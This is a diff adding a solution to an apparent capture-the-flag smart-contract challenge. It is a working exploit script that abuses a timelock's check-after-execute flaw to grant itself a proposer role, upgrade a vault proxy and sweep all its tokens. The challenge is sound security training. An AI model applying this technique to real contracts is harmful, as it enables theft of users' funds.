@@ -52,7 +52,40 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+        /** EXPLOIT
+            The vulnerability lies in the ClimberTimelock contract, in the 'execute' function which checks the status of the operation AFTER the call.
+            This allows an attacker to make any function call to other contracts with the 'identity' (i.e. msg.sender) of the timelock contract.
+            This can be exploited to essentially break the scheduling funtionnalty has calls can be scheduled retrospectively.
+
+            Since the timelock contract is an Admin of itself AND owner of the ClimberVault, we can use thoses roles to sweep all tokens in the vault in the following manner:
+                1. Grant a "PROPOSER" role to a custom contract and use the new role to schedule the call itself, validating the operation.
+                2. Schedule a call to upgrade the vault and call 'setSweeper' with the attacker's address.
+                3. Execute the call
+                4. Sweep funds
+                5. ???
+                6. Profit
+        */
+        let salt = "0x" + "00".repeat(32);
+        this.exploit = await (await ethers.getContractFactory('ClimberExploit', attacker)).deploy(this.timelock.address);
+        await this.timelock.execute(
+            [this.timelock.address, this.exploit.address], // Targets
+            [0, 0], // Values (unused)
+            [
+                this.timelock.interface.encodeFunctionData("grantRole", [await this.timelock.PROPOSER_ROLE(), this.exploit.address]), // First function call grants "PROPOSER" role to our exploit contract
+                this.exploit.interface.encodeFunctionData("scheduleProposerRole") // Second function call enables exploit contract to schedule this 'execute' transaction
+            ],
+            salt // Not forgetting salt (unused)
+        );
+
+        // Since timelock contract is owner, we can trigger an upgrade to our exploit contract through an 'execute' call
+        let sweepParameters = [[this.vault.address], [0], [this.vault.interface.encodeFunctionData("upgradeToAndCall", [
+            this.exploit.address,
+            this.exploit.interface.encodeFunctionData("setSweeper", [attacker.address])
+            ])]
+        ];
+        await this.exploit.schedule(...sweepParameters); // Since the exploit contract is now a 'PROPOSER' we can schedule this execute call
+        await this.timelock.execute(...sweepParameters, salt); // Execute it
+        await (await this.vault.connect(attacker)).sweepFunds(this.token.address); // Sweep all tokens !
     });
 
     after(async function () {
